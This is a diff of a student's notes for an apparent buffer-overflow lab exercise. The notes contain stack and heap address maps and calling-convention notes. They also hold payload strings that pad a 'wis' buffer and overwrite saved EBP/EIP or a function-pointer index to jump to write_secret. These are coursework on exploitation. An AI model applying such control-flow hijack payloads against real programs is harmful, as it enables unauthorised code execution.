@@ -1,19 +1,54 @@
-1878446740
+stack pointer (ESP) 
+base pointer (EBP)
+instruction pointer (EIP)
 
 Question 10:
 	0xbffff130 - 0x804a0d4 = (0xB7FB505C + 64) / sizeof(fptr) = 
 		                 (3086700636 + 64) / 4 = 771675175
 
-wis            return
-0xbffff078 - 0x0804872e = 3086707018
+Question 11:
+                 location    in little edian hex
+    write_secret 0x8048534 \x34\x85\x04\x08
+    771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
 
-771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+Question 12:
+                 location    in little edian hex
+    write_secret 0x8048534 \x34\x85\x04\x08
+       ebp          wis
+    0xbffff108 - 0xbffff078 = 0x90 (144 bytes)
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAAAAAAAAAAAAAE\x34\x85\x04\x08
+    
+                 location    in little edian hex
+    write_secret 0x8048534 \x34\x85\x04\x08
+      eip           wis
+    0xbffff10c - 0xbffff078 = 0x94 (148 bytes)
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASAAAAAAAAAAAAAAAAAAAAE\x34\x85\x04\x08
+
+    0x8048808: tmp()
+    0x8048809
+    0x804880a
+    0x804880b
+    0x804880c
+    0x804880d: //where program will return after exe tmp()
 
 
+//Stack grows down. So allocations are in chunks that go down in memory. When you use those chucks you're writing up in mem.
+//Calling function:
+//1. Push arguments onto the stack (in reverse)
+//2. Push the return address, i.e., the address of the instruction you want to run after control returns to you
+//3. Jump to the functions address
+//Called function
+//4. Push the old frame pointer onto the stack ($ebp)
+//5. Set frame pointer ($ebp) to where the end of the stack is right now ($esp)
+//6. Push local variables onto the stack
+// Returning function:
+//7. Reset the previous stack frame: $esp = $ebp, $ebp = ($ebp)
+//8. Jump back to return address: $eip = $esp + 4
+// [ ...| loc2 | loc1 | $ebp | $eip | arg1 | arg2 | arg3 | caller's data ]
 
+=================== ▼ STACK ▼ ==========================
 
-=================== HEAP ============================
-
+--------------- main ---------------------
 ...
 
 0xbffff53c | tmp       | //fptrs tmp
@@ -28,15 +63,43 @@ wis            return
 
 ...
 
-0x804a0dc  | ptrs[2] |
-0x804a0d8  | ptrs[1] |
-0x804a0d4  | ptrs[0] | //fptrs ptrs[3]
+------------ put_wisdom ------------------
+0xbffff10c | eip       |
+0xbffff108 | ebp       |
+0xbffff104 | edi       |
+
+...
+0xbffff0fc | *l        | //WisdomList *l
+0xbffff0f8 | r         | //int r
+0xbffff0f7 | wis[127]  | //
+...
+0xbffff078 | wis       | //char wis[DATA_SIZE]
+
+====================================================
 
 ...
 
-0x00000000 | stack   |
-=================== ^ STACK ^ =======================
+=================== ▲ HEAP ▲ =======================
 
+...
+0x804a0ec  | head*   | //struct _WisdomList * head
+...
+0x804a0e8  | infd    | //int infd = 0
+...
+0x804a0dc  | ptrs[2] |
+0x804a0d8  | ptrs[1] |
+0x804a0d4  | ptrs[0] | //fptrs ptrs[3]
+...
+0x804a0d0  | outfd   | //int outfd
+...
+0x804a0c2  | secret  | // char secret[]
+=================== ▲ DATA ▲ ========================
+
+...
+
+0x00000000 
+=================== ▲ TEXT ▲ ========================
+===================== File ==========================
 
 
 ----------- Attempt 1 -------------------
@@ -66,5 +129,21 @@ head
 * 0xbffff534
 * 771675416
 * 771675175
-\x34\x85\x04\x08
+* \x34\x85\x04\x08
 3086707018
+
+
+---------- attempt 3 --------------------
+
+tmp
+100
+wis
+62
+* 0xbffff130
+* 0x804a0d4
+* 0x8048534
+* 0xbffff534
+* 771675416
+* 771675175
+* \x34\x85\x04\x08
+148
